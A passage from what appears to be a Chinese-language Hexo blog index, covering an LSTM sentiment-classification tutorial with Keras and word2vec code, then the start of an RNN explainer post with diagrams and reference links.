keyword">import</span> jieba<span class="token keyword">import</span> keras<span class="token punctuation">,</span>re</code></pre><blockquote><ol start="2"><li>读取并处理训练词向量文本</li></ol></blockquote><pre class=" language-python"><code class="language-python">voc_dim<span class="token operator">=</span><span class="token number">100</span><span class="token comment" spellcheck="true">#词向量100维度</span>input_dim<span class="token operator">=</span><span class="token number">0</span><span class="token comment" spellcheck="true">#词向量长度</span><span class="token triple-quoted-string string">"""读取训练词向量文本文本格式：格式："这 两句 想起 我 想起 我 哀婉 的 心 都 碎 了\n"        "胡子拉碴 的 这 是 妖\n"    处理后：[        ['这', '两句', '想起', '我', '想起', '我', '哀婉', '的', '心', '都', '碎', '了']        ,['胡子拉碴', '的', '这', '是', '妖']        ]"""</span><span class="token keyword">def</span> <span class="token function">load_file</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'r+'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        words<span class="token operator">=</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        word_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> word <span class="token keyword">in</span> words<span class="token punctuation">:</span>            word_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>word<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> word_list    <span class="token comment" spellcheck="true">#words=load_file("word2vec.txt")</span></code></pre><blockquote><ol start="3"><li>训练词向量</li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token triple-quoted-string string">"""训练词向量word2vec"""</span><span class="token keyword">def</span> <span class="token function">word2vec_train</span><span class="token punctuation">(</span>words<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""训练词模型"""</span>    model<span class="token operator">=</span>Word2Vec<span class="token punctuation">(</span>sentences<span class="token operator">=</span>words<span class="token punctuation">,</span><span class="token comment" spellcheck="true">#可迭代对象</span>                   size<span class="token operator">=</span>voc_dim<span class="token punctuation">,</span><span class="token comment" spellcheck="true">#100维词向量</span>                   min_count<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#最小出现个数</span>                   workers<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#cpu3</span>                   iter<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#迭代20次</span>    model<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"word2vec.model"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"word2vec.model"</span><span class="token comment" spellcheck="true">#word2vec_train(words)</span></code></pre><blockquote><ol start="4"><li>加载训练词模型</li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token triple-quoted-string string">"""加载训练词模型返回为：词向量的长度,和模型"""</span><span class="token keyword">def</span> <span class="token function">load_word2vec</span><span class="token punctuation">(</span>name_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    model<span class="token operator">=</span>Word2Vec<span class="token punctuation">.</span>load<span class="token punctuation">(</span>name_path<span class="token punctuation">)</span>    word_length<span class="token operator">=</span>len<span class="token punctuation">(</span>model<span class="token punctuation">.</span>wv<span class="token punctuation">.</span>vocab<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> word_length<span class="token punctuation">,</span>model</code></pre><blockquote><ol start="5"><li>对应词转化为向量维度</li></ol></blockquote><pre class=" language-python"><code class="language-python">input_dim<span class="token punctuation">,</span>model<span class="token operator">=</span>load_word2vec<span class="token punctuation">(</span><span class="token string">"word2vec.model"</span><span class="token punctuation">)</span>input_dim<span class="token operator">=</span>input_dim<span class="token operator">+</span><span class="token number">1</span><span class="token comment" spellcheck="true">#生成对应词向量的维度</span>embedding_weights<span class="token operator">=</span>np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>input_dim<span class="token punctuation">,</span>voc_dim<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#词向量对应的索引</span>w2dic <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;</span><span class="token keyword">for</span> j<span class="token punctuation">,</span>key <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>model<span class="token punctuation">.</span>wv<span class="token punctuation">.</span>vocab<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    embedding_weights<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">=</span>model<span class="token punctuation">.</span>wv<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    w2dic<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">=</span>j<span class="token operator">+</span><span class="token number">1</span></code></pre><blockquote><ol start="6"><li>读取训练数据并处理</li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token triple-quoted-string string">"""读取训练数据切分成"""</span><span class="token keyword">def</span> <span class="token function">split_train_data</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'r+'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>        lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>            r <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span><span class="token string">'[\u4e00-\u9fa5]+'</span><span class="token punctuation">)</span>            line<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>r<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span>            words<span class="token operator">=</span>jieba<span class="token punctuation">.</span>cut<span class="token punctuation">(</span>line<span class="token punctuation">)</span>            content<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token keyword">for</span> word <span class="token keyword">in</span> words<span class="token punctuation">:</span>                content<span class="token punctuation">.</span>append<span class="token punctuation">(</span>word<span class="token punctuation">)</span>            <span class="token keyword">if</span> len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"train"</span><span class="token operator">+</span>path<span class="token punctuation">,</span><span class="token string">'a+'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#load_train_data("pos.txt")</span><span class="token comment" spellcheck="true">#load_train_data("neg.txt")</span></code></pre><blockquote><ol start="7"><li>加载lstm训练数据</li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token triple-quoted-string string">"""加载训练数据积极：30000消极：30000"""</span><span class="token keyword">def</span> <span class="token function">load_train_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pos<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    neg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'trainpos.txt'</span><span class="token punctuation">,</span><span class="token string">'r+'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            pos<span class="token punctuation">.</span>append<span class="token punctuation">(</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'trainneg.txt'</span><span class="token punctuation">,</span><span class="token string">'r+'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            neg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#消极语料和积极语料拼接在一起</span>    train_list<span class="token operator">=</span> np<span class="token punctuation">.</span>concatenate<span class="token punctuation">(</span><span class="token punctuation">(</span>pos<span class="token punctuation">,</span> neg<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#y表示积极对应的标签为1，消极语料对应的标签为0</span>    y <span class="token operator">=</span> np<span class="token punctuation">.</span>concatenate<span class="token punctuation">(</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>ones<span class="token punctuation">(</span>len<span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>int<span class="token punctuation">)</span><span class="token punctuation">,</span>                            np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>len<span class="token punctuation">(</span>neg<span class="token punctuation">)</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>int<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> train_list<span class="token punctuation">,</span>y</code></pre><blockquote><ol start="8"><li>对训练集处理</li></ol></blockquote><pre class=" language-python"><code class="language-python">train_list<span class="token punctuation">,</span>y<span class="token operator">=</span>load_train_data<span class="token punctuation">(</span><span class="token punctuation">)</span>train_list<span class="token punctuation">,</span>y<span class="token comment" spellcheck="true"># In[10]:</span><span class="token comment" spellcheck="true">#打乱训练集</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>train_list<span class="token punctuation">)</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>y<span class="token punctuation">)</span></code></pre><blockquote><ol start="9"><li>加载停用词</li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token triple-quoted-string string">"""加载停用词"""</span><span class="token keyword">def</span> <span class="token function">StopWords</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    StopWords<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'stopWords.txt'</span><span class="token punctuation">,</span><span class="token string">'r+'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>            StopWords<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> StopWordsstopwords<span class="token operator">=</span>StopWords<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><ol start="10"><li>引用词向量</li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token triple-quoted-string string">"""#训练模型转化为model词向量中索引['好 悲伤 的 感觉', '酱 好 可怜']--->[['好', '悲伤', '的', '感觉'], ['酱', '好', '可怜']][[0, 8708, 0, 69], [1008, 0, 4151]]"""</span><span class="token keyword">def</span> <span class="token function">sentence_convert_word</span><span class="token punctuation">(</span>sentence_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    textlist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> sentence <span class="token keyword">in</span> sentence_list<span class="token punctuation">:</span>        textlist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>sentence<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#将词转化为model词向量中索引</span>    cut_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> text <span class="token keyword">in</span> textlist<span class="token punctuation">:</span>        data<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span>word <span class="token keyword">in</span>  enumerate<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> word <span class="token operator">not</span> <span class="token keyword">in</span> stopwords<span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>w2dic<span class="token punctuation">[</span>word<span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>                            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        cut_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">return</span> cut_listtrainlists<span class="token operator">=</span>sentence_convert_word<span class="token punctuation">(</span>train_list<span class="token punctuation">)</span>trainlists<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span></code></pre><blockquote><ol start="11"><li>计算句子平均长度</li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token triple-quoted-string string">"""计算训练模型的平均长度"""</span><span class="token keyword">def</span> <span class="token function">length_train</span><span class="token punctuation">(</span>lists<span class="token punctuation">)</span><span class="token punctuation">:</span>    sentence_count<span class="token operator">=</span><span class="token punctuation">[</span>len<span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token keyword">for</span> word <span class="token keyword">in</span> lists<span class="token punctuation">]</span>    sentence_count<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>sentence_count<span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'tokens count'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'tokens length'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#计算句子的平均长度</span>    <span class="token comment" spellcheck="true"># 可以使用 取tokens的平均值并且加上两个tokens的标准差，来选用tokens的长度</span>    avg_length <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>sentence_count<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>std<span class="token punctuation">(</span>sentence_count<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"平均长度："</span><span class="token punctuation">,</span>avg_length<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#计算符合句子长度的概率</span>    l<span class="token operator">=</span>np<span class="token punctuation">.</span>sum<span class="token punctuation">(</span>sentence_count <span class="token operator">&lt;</span>avg_length<span class="token punctuation">)</span> <span class="token operator">/</span> len<span class="token punctuation">(</span>sentence_count<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"小于平均长度的概率："</span><span class="token punctuation">,</span>l<span class="token punctuation">)</span>            <span class="token keyword">return</span> int<span class="token punctuation">(</span>avg_length<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span>avg_length<span class="token operator">=</span>length_train<span class="token punctuation">(</span>trainlists<span class="token punctuation">)</span>avg_length<span class="token operator">=</span><span class="token number">20</span></code></pre><blockquote><ol start="12"><li>对训练样本进行剪切和填充</li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token triple-quoted-string string">"""#对训练样本进行剪切和padding#并将样本分割为"""</span><span class="token keyword">def</span> <span class="token function">train_con_padding</span><span class="token punctuation">(</span>cut_list<span class="token punctuation">,</span>avg_length<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    x_train_tokens_pad<span class="token operator">=</span>sequence<span class="token punctuation">.</span>pad_sequences<span class="token punctuation">(</span>cut_list<span class="token punctuation">,</span>maxlen<span class="token operator">=</span>avg_length<span class="token punctuation">,</span>padding<span class="token operator">=</span><span class="token string">'pre'</span><span class="token punctuation">,</span>truncating<span class="token operator">=</span><span class="token string">'pre'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x_train_tokens_pad<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 使用90%进行训练，10%进行测试</span>    x_train<span class="token punctuation">,</span> x_test<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> y_test <span class="token operator">=</span> train_test_split<span class="token punctuation">(</span>        x_train_tokens_pad<span class="token punctuation">,</span>        y<span class="token punctuation">,</span>        test_size<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>        random_state<span class="token operator">=</span><span class="token number">12</span>    <span class="token punctuation">)</span>    <span class="token keyword">return</span>  x_train<span class="token punctuation">,</span> x_test<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> y_test     x_train<span class="token punctuation">,</span> x_test<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> y_test <span class="token operator">=</span>  train_con_padding<span class="token punctuation">(</span>trainlists<span class="token punctuation">,</span>avg_length<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># In[16]:</span>y_train <span class="token operator">=</span> keras<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>to_categorical<span class="token punctuation">(</span>y_train<span class="token punctuation">,</span> num_classes<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>y_test <span class="token operator">=</span> keras<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>to_categorical<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> num_classes<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre><blockquote><ol start="13"><li>构建lstm 模型</li></ol></blockquote><pre class=" language-python"><code class="language-python">y_train <span class="token operator">=</span> keras<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>to_categorical<span class="token punctuation">(</span>y_train<span class="token punctuation">,</span> num_classes<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>y_test <span class="token operator">=</span> keras<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>to_categorical<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> num_classes<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># In[17]:</span><span class="token comment" spellcheck="true">#构建模型</span>model <span class="token operator">=</span> Sequential<span class="token punctuation">(</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>     Embedding<span class="token punctuation">(</span>        output_dim<span class="token operator">=</span>voc_dim<span class="token punctuation">,</span>        input_dim<span class="token operator">=</span>input_dim<span class="token punctuation">,</span>        mask_zero<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>        weights<span class="token operator">=</span><span class="token punctuation">[</span>embedding_weights<span class="token punctuation">]</span><span class="token punctuation">,</span>        input_length<span class="token operator">=</span>avg_length<span class="token punctuation">)</span> <span class="token punctuation">)</span>model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>LSTM<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span>activation <span class="token operator">=</span><span class="token string">'softsign'</span><span class="token punctuation">,</span>dropout<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">,</span> recurrent_dropout<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>Dense<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>Activation<span class="token punctuation">(</span><span class="token string">'sigmoid'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>adam<span class="token operator">=</span>Adam<span class="token punctuation">(</span>lr<span class="token operator">=</span><span class="token number">0.0004</span><span class="token punctuation">,</span> beta_1<span class="token operator">=</span><span class="token number">0.9999</span><span class="token punctuation">,</span> beta_2<span class="token operator">=</span><span class="token number">0.999999</span><span class="token punctuation">,</span> epsilon<span class="token operator">=</span><span class="token number">1e</span><span class="token operator">-</span><span class="token number">08</span><span class="token punctuation">,</span> decay<span class="token operator">=</span><span class="token number">0.0</span><span class="token punctuation">,</span> amsgrad<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>loss<span class="token operator">=</span><span class="token string">'binary_crossentropy'</span><span class="token punctuation">,</span> optimizer<span class="token operator">=</span>adam<span class="token punctuation">,</span> metrics<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token string">'acc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># In[ ]:</span><span class="token comment" spellcheck="true"># 训练30轮，每轮都进行测试集的验证，使用1%用来测试集，每批128</span>history <span class="token operator">=</span>model<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> batch_size<span class="token operator">=</span><span class="token number">128</span><span class="token punctuation">,</span> epochs<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>validation_split<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># In[ ]:</span><span class="token comment" spellcheck="true">#检测训练结果</span>score <span class="token operator">=</span> model<span class="token punctuation">.</span>evaluate<span class="token punctuation">(</span>x_test<span class="token punctuation">,</span> y_test<span class="token punctuation">)</span></code></pre><blockquote><ol start="14"><li>评估标准</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221122093004.png" alt="image-20221122093004388"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221122093022.png" alt="image-20221122093022605"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/qian99/article/details/88628383?ops_request_misc=%7B%22request_id%22:%22165302813316781818737206%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165302813316781818737206&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-88628383-null-null.142%5Ev10%5Econtrol,157%5Ev4%5Econtrol&utm_term=lstm&spm=1018.2226.3001.4187">(20条消息) LSTM 详解_qian99的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_44967199/article/details/103009371">(20条消息) 循环神经网络—LSTM_流浪码工的博客-CSDN博客</a></p><p><a href="https://www.bilibili.com/video/BV1Z34y1k7mc/?spm_id_from=333.880.my_history.page.click&vd_source=5e8f069711510b3788382a0a03ff38e5">【LSTM长短期记忆网络】3D模型一目了然，带你领略算法背后的逻辑_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RNN</title>
      <link href="/2022/11/17/RNN/"/>
      <url>/2022/11/17/RNN/</url>
      
        <content type="html"><![CDATA[<h1 id="RNN-循环神经网络"><a href="#RNN-循环神经网络" class="headerlink" title="RNN 循环神经网络"></a>RNN 循环神经网络</h1><h2 id="1-为什么出现RNN"><a href="#1-为什么出现RNN" class="headerlink" title="1.为什么出现RNN"></a>1.为什么出现RNN</h2><p><strong>在传统的神经网络模型</strong>中，是从<strong>输入层到隐含层再到输出层</strong>，<strong>层与层之间是全连接的</strong>，每<strong>层之间的节点是无连接的</strong>。但是这种普通的神经网络对于很多问题却无能无力。例如，你要<strong>预测</strong>句子的<strong>下一个单词</strong>是什么，一般需要<strong>用到前面的单词</strong>，因为一个句子中<strong>前后单词</strong>并<strong>不是独立</strong>的。</p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221117203703.png" alt="image-20221117203703769"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221117195451.png" alt="image-20221117195451836"></p><p><strong>对于每次输入的图片，图片在时间上是没有关系，cnn可以解决</strong>。</p><h2 id="2-RNN-介绍"><a href="#2-RNN-介绍" class="headerlink" title="2.RNN 介绍"></a>2.RNN 介绍</h2><blockquote><ol><li>定义</li></ol></blockquote><p><strong>RNN称为循环神经网络</strong>，即<strong>一个序列当前的输出与前面的输出也有关</strong>。</p><p>具体的表现形式为<strong>网络</strong>会对<strong>前面</strong>的<strong>信息进行记忆并应用</strong>于<strong>当前输出的计算中</strong>，即隐<strong>藏层之间的节点不再无连接而是有连接的</strong>，并且<strong>隐藏层的输入</strong>不仅<strong>包括输入层的输出</strong>还<strong>包括上一时刻隐藏层的输出</strong>。<br>原文链接：<a href="https://blog.csdn.net/fighting_qq/article/details/126708149">https://blog.csdn.net/fighting_qq/article/details/126708149</a></p><blockquote><ol start="2"><li>RNN 形式</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221117211602.png" alt="image-20221117211602492"></p><p>RNN形式详解：</p><p><a href="https://www.jiqizhixin.com/articles/2018-12-14-4">RNN 结构详解 | 机器之心 (jiqizhixin.com)</a></p><p><a href="https://www.bilibili.com/video/BV1D64y1z7CA/?spm_id_from=333.999.0.0&vd_source=5e8f069711510b3788382a0a03ff38e5">54 循环神经网络 RNN【动手学深度学习v2】_哔哩哔哩_bilibili</a></p><h2 id="3-RNN-可视化"><a href="#3-RNN-可视化" class="headerlink" title="3.RNN 可视化"></a>3.RNN 可视化</h2><blockquote><ol><li>时间序列上RNN 3D可视化图</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221117200557.png" alt="image-20221117200557206"></p><blockquote><ol start="2"><li>RNN 可视化图解释</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221117201306.png" alt="image-20221117201306487"></p><blockquote><ol start="3"><li>RNN解决上面买苹果手机问题</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221117203634.png" alt="image-20221117203634545"></p><blockquote><ol start="4"><li>RNN 图循环图解释</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221117204514.png" alt="image-20221117204514287"></p><blockquote><ol start="5"><li>RNN 序列图解释</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221117205135.png" alt="image-20221117205135747"></p><h2 id="4-RNN-例子解释"><a href="#4-RNN-例子解释" class="headerlink" title="4. RNN 例子解释"></a>4. RNN 例子解释</h2><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221117212540.png" alt="image-20221117212540178"></p><h2 id="5-RNN-结构数学解释"><a href="#5-RNN-结构数学解释" class="headerlink" title="5.RNN 结构数学解释"></a>5.RNN 结构数学解释</h2><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221118093127.png" alt="image-20221118093127905"></p><p><strong>左边 